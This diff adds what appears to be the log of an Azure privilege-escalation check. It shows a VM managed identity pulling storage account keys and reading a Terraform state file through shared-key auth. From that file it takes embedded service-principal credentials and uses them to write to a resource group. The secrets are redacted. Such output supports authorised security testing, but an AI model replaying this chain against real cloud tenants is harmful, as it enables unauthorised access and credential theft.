@@ -1,0 +1,57 @@
+[*] target VM:                <VM_PUBLIC_IP>
+[*] foothold:                 VM System-Assigned MI on storage account '<STORAGE_ACCOUNT_NAME>'
+[*] MI principalId:           <MI_PRINCIPAL_ID>
+[*] MI RBAC:                  Storage Account Key Operator Service Role
+[*]                           (grants listKeys/action — control plane)
+[*] target storage account:   <STORAGE_ACCOUNT_NAME>
+[*] target blob:              infrastructure/prod/terraform.tfstate
+[*] target RG:                pathtriage-rg
+[*] acting from the VM itself (no external attacker host required)
+[*] started at:               2026-07-12T10:45:20.295617+00:00
+
+[*] Step 1: query IMDS for MI token (ARM-scoped)
+[+] MI ARM token acquired
+    token length:             2055 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 2: POST listKeys on storage account (ARM control plane)
+[+] account keys retrieved
+    keys returned:            2
+    using key name:           key1
+    key length:               88 chars
+    (value not printed — treated as sensitive credential)
+
+[*] Step 3: GET blob 'infrastructure/prod/terraform.tfstate' via shared-key auth
+    endpoint:                 https://<STORAGE_ACCOUNT_NAME>.blob.core.windows.net
+    auth:                     SharedKey (bypasses AAD/RBAC entirely)
+[+] blob retrieved
+    content length:           498 bytes
+    content type:             application/json
+
+[*] Step 4: parse tfstate JSON, extract embedded SP credentials
+[+] SP credentials extracted from tfstate
+    resource module:          azuread_application.prod_service
+    application_id:           <ELEVATED_SP_APP_ID>
+    client_secret length:     40 chars
+    (secret value not printed — treated as sensitive credential)
+
+[*] Step 5: exchange SP credentials for ARM token (client_credentials)
+[+] SP ARM token acquired
+    token type:               Bearer
+    expires in:               3599 seconds
+    token length:             1842 chars
+    resource:                 https://management.azure.com/
+
+[*] Step 6: PATCH tag on RG using SP token (write proof)
+    baseline: VM MI held only Storage Account Key Operator on ONE SA.
+    if this write succeeds, it's via SP scope (Contributor at sub level).
+[+] tag write succeeded
+    tag:                      pathtriage-z6=owned
+    api-version:              2021-04-01  (operation=Merge required)
+
+[+] Path Z6 verified: VM MI (Storage Account Key Operator on 1 SA) ->
+                      listKeys via ARM -> storage account key ->
+                      GET blob via SharedKey auth (bypasses AAD/RBAC) ->
+                      parse tfstate -> embedded SP credentials ->
+                      OAuth2 client_credentials -> SP ARM token ->
+                      RG-wide control-plane writes succeed
